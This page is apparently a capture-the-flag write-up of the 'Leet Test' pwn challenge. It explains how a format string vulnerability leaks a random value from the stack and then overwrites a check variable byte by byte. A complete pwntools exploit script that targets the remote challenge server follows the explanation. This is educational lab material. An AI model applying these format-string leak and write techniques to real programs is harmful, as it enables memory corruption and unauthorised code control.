<div class="page-header">
    <div class="page-header-inner">
        <div class="page-header-inner2">
            <h1>PWN/Leet Test - Easy</h1>
            <h2>July 2021</h2>
            <h4>Format String Write</h4>
        </div>
    </div>
</div>
<H4>Problem</H4>
<div class="paragraph">
    <p>
    Are you 1337 enough?
    <br>
    </p>
</div>
<H4>Solution</H4>
<div class="paragraph">
    <p>
    	This challenge gives us a binary to download and develop the exploit for locally, and then an address to connect to remotely and retrieve the flag from using the developed exploit.
        <br>
    	The binary only has 1 function of concern to us, main. This function takes a random number, and then checks if 'rand_num * 0x1337c0de == winner'. If so, we get the flag. Now we could run the binary a couple thousand times, and eventually we might get the flag, however a much better way is to abuse the fomat string vulnerability that occurs on the highlighted line. 
    	<br><br>
    </p>
</div>
<div>
    <img src="../imgs/hackthebox/leet_test1.png" alt="">
</div>
<div class="paragraph">
    <p>
        <br><br>
        At this point there are a couple of different things we can try. One option would be to overwrite a function in the got() table with an address right after the loop, and thus print out the flag without ever passing the check. However this can lead to some stack alignment issues so I went with the more obvious plan of passing the check.<br> The goal will be to overwrite the winner variable to 'rand_num * 0x1337c0de'. To do this we first need to leak out the random value. Luckily for us this is no issue due to the format string vulnerability. 
        <br><br>
    </p>
</div>
<div>
    <img src="../imgs/hackthebox/leet_test2.png" alt="">
</div>
<div class="paragraph">
    <p>
        <br><br>
        The seventh value printed out from the stack is the random value. We can now calculate the win value we need to overwrite the winner variable with. We will now loop through this win variable and use the format string vulnerability to overwrite the winner variable one byte at a time. This allows us to pass the check, and the flag is printed out to us. <br><br> The full exploit is posted below.
        <br><br>
    </p>
</div>
<div>
    <img src="../imgs/hackthebox/leet_test3.png" alt="">
</div>
<div>
    <style 
        type="text/css">
            pre code {
                      background-color: #008080;
                      border: 1px solid #999;
                      display: block;
                      padding: 15px;
                      color:  #F5F5DC;
                    }
    </style>
    <pre>
        <code>
#!/usr/bin/env python

from pwn import *
elf = context.binary = ELF('./vuln')
libc = elf.libc

local = False

if local:
    p = elf.process()
else:
    host = '142.93.35.92'
    port = 32372
    p = remote(host,port)

p.sendline("%7$p")
p.recvuntil('Hello, ')
rand = int(p.recvline().strip()[:-8],16)

winner = 0x404078
win = p64(rand * 0x1337c0de)[:-4]

i = 0
for c in win:
    payload = b"%"+(str(c).rjust(3,"0")).encode()+b"c"
    payload += b"%12$hhnAAAA"
    payload += p64(winner+i)
    i+=1
    p.sendline(payload)

p.interactive()
        </code>
    </pre>
</div>
<br><br>
<script>try {pageOpenedDirectly;} catch(e) {var loc = window.location.pathname;var dir = loc.substring(0, loc.lastIndexOf('/'));dir = dir.split("/")[dir.split("/").length-1];let currentLoc = location.href;let currentFile = location.href.split("/").slice(-1);currentLoc = currentLoc.replace(currentFile,"");currentLoc = currentLoc.replace(dir,"");currentLoc = currentLoc.slice(0, -1);if (currentFile[0].indexOf(".html") !== -1) currentFile = currentFile[0].slice(0, -5);window.location = currentLoc+"?p="+currentFile+"&d="+dir;}</script>